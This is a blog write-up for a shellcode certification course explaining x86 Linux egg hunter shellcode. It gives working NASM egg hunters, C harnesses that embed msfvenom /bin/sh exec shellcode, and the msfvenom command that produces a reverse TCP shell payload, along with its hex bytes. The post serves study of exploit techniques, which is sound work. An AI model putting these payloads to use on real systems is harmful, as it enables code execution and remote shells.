---
layout: post
title:  "SLAE Assignment 3 - Egg hunter"
date:   2017-04-21
categories: certification
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
Hello everybody,  
  
So here we are for the third part of our shellcodes serie. Today we will deal with the concept of egg hunter shellcode.  
  
## Assignment 3:  
  
Code is available on my [github repo](https://github.com/phackt/slae/tree/master/assignment3).  
    
**Our Goal:**  
> *Study about the egg hunter shellcode*
 - *Create a working demo of the Egghunter*
 - *Should be configurable for different payloads*  
  
So what is an egg hunter and its related egg shellcode?  
  
While your exploiting buffer overflows, the shellcode you inject will face several constraints in order to properly execute, and the size limit is one of them. An idea is to stage the shellcode: the first stage will be a small shellcode looking for the effective and bigger second one.  
  
Here is a bit of litterature that may help to understand the egg hunter concept:  
[http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)  
[http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/](http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/)  
  
The above second link will provide a good overview of the Linux memory layout.  For this exercise, we will use an in-memory egg hunter shellcode.   
  
So let's try with a first example:  
```nasm
global  _start

section .text
_start:

    mov eax, _start             ; we set a valid .text address into eax
    mov ebx, dword 0x50905091   ; we can avoid an 8 bytes tag in egg if the tag
    dec ebx                     ; can not be found in the egg hunter, that's why we decrement to look for 
                                ; 0x50905090 - push eax, nop, push eax, nop

next_addr:

    inc eax
    cmp dword [eax], ebx        ; do we found the tag ?
    jne next_addr
    jmp eax                     ; yes we do so we jump to the egg

```
  
*N.B: Our egg hunter is under submission on exploit-db.*  
  
Now let's update [shellcode.c](https://github.com/phackt/slae/blob/master/assignment3/shellcode.c):  
```c
#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\xb8\x60\x80\x04\x08\xbb\x91\x50\x90\x50\x4b\x40\x39\x18\x75\xfb\xff\xe0";

unsigned char egg[] = \
"\x90\x50\x90\x50" // egg mark - do not remove
"\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" // msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00
"\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac"
"\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54"
"\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf"
"\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2";

void main()
{

	printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Egg shellcode Length:  %d\n", strlen(egg));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
```
  
Let's run our egg hunter:    
![image1]({{ site.url }}/public/images/slae/assignment3/image1.png)  
  
Perfect, but why did it work ?  In our shellcode.c the egg has been placed in the .data segment (global initialized variables). According to the following picture (anatomy of a program in memory), we can see that the .text, .data and .bss segments are contigous:  

![linuxflexibleaddressspacelayout.png]({{ site.url }}/public/images/slae/assignment3/linuxflexibleaddressspacelayout.png)  
  
let's check for our shellcode executable in gdb:  
![image2]({{ site.url }}/public/images/slae/assignment3/image2.png)  
  
Our three first segments are respectively the .text, .data, .bss segment. As we can see, we have no blank space between them.  
If it was the case, we would have had a segmentation fault (SIGSEGV - Signal Segmentation Violation).  
  
Let's try now to place our egg shellcode in the heap space (we keep the same egg hunter):  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x50\x90\x50\x90"

unsigned char egghunter[] = \
"\xb8\x60\x80\x04\x08\xbb\x91\x50\x90\x50\x4b\x40\x39\x18\x75\xfb\xff\xe0";

unsigned char egg[] = \
EGG
"\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" // msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00
"\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac"
"\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54"
"\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf"
"\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2";

void main()
{

	char *shellcode_heap = malloc(sizeof(egg)); // shellcode egg + egg mark
	memcpy(shellcode_heap, egg, sizeof(egg));

	printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Egg shellcode Length:  %d\n", strlen(shellcode_heap));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
```
  
Running and executing it:  
```bash
# ./shellcode_heap
Egg hunter shellcode Length:  18
Egg shellcode Length:  4
Erreur de segmentation
```
  
Let's look at the memory mapping after the malloc call:  
![image3]({{ site.url }}/public/images/slae/assignment3/image3.png)  
  
So we met our segmentation violation and we saw that we have blank spaces between our .text segment (where our egg hunter is starting to look for the egg shellcode) and the heap space (where our egg shellcode is located).  

A technique consists in using the **access** system call that originally check users permissions for a file. Giving our memory address as the first argument, we will be able to check if a memory page is accessible. If not, the syscall will return EFAULT (14) into EAX:  
```
int access(const char *pathname, int mode);
```
  
Syscall number:  
```
#define __NR_access 33
```
  
Dans /usr/include/asm-generic/errno-base.h:  
```
#define	EFAULT		14	/* Bad address */
```
  
We will go through the memory pages and parse each readable memory page in order to look for our egg shellcode.  
```bash
# getconf PAGE_SIZE
4096
```
  
Here is what our new egg hunter looks like:  
```nasm
global _start
 
section .text
 
_start:

        xor ecx,ecx         ; ecx zeroed out
        mul ecx             ; clear eax, edx

 next_page:
        or bx, 0xfff        ; 0x1000 - 1 (4095)
        mov edi, dword 0x50905091
        dec edi

next_addr:
        inc ebx             ; +1 so we move to the next 4096 bytes (next page)
        push byte 0x21      ; access syscall
        pop eax
        int 0x80
 
        cmp al, 0xf2         ; check for EFAULT
        je _start            ; if EFAULT, we are going to the nextpage
        cmp dword [ebx], edi ; our egg mark
        jne next_addr        ; we are parsing the readable memory page
        lea eax, [ebx+4]     ; @ of the shellcode
        jmp eax
```
  
Replacing the egg hunter in our [shellcode_heap.c](https://github.com/phackt/slae/blob/master/assignment3/shellcode_heap.c) with the above egg hunter shellcode, compiling and executing provides:  
```bash
# gcc -o shellcode_heap shellcode_heap.c  && ./shellcode_heap
Egg hunter shellcode Length:  34
Egg shellcode Length:  74
# id  
uid=0(root) gid=0(root) groups=0(root)
# 
```
  
You can try with any egg shellcode you want and set it just after the EGG variable.  Let's try with a TCP reverse shellcode:  
```bash
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -b \x00
...
unsigned char buf[] = 
"\xbb\x6d\xed\x21\x01\xdb\xcf\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x12\x31\x5a\x12\x83\xea\xfc\x03\x37\xe3\xc3\xf4\xf6\x20\xf4"
"\x14\xab\x95\xa8\xb0\x49\x93\xae\xf5\x2b\x6e\xb0\x65\xea\xc0"
"\x8e\x44\x8c\x68\x88\xaf\xe4\x15\x6a\x50\xf5\x81\x68\x50\xe4"
"\x0d\xe4\xb1\xb6\xc8\xa6\x60\xe5\xa7\x44\x0a\xe8\x05\xca\x5e"
"\x82\xfb\xe4\x2d\x3a\x6c\xd4\xfe\xd8\x05\xa3\xe2\x4e\x85\x3a"
"\x05\xde\x22\xf0\x46";
```
  
Let's compile and execute shellcode_heap.c:  
```bash
gcc -o shellcode_heap shellcode_heap.c  && ./shellcode_heap
Egg hunter shellcode Length:  34
Egg shellcode Length:  99

```
  
In another windows:  
![image4]({{ site.url }}/public/images/slae/assignment3/image4.png)  
  
So in this article we just saw how to create a two-staged shellcode. One stage consists in injecting our effective payload (the biggest one) and the second one consists in a small hunter shellcode looking for the first one.  
  
Hope you enjoyed,  
Don't hesitate to comment and share.  
  
[Phackt](https://twitter.com/phackt_ul)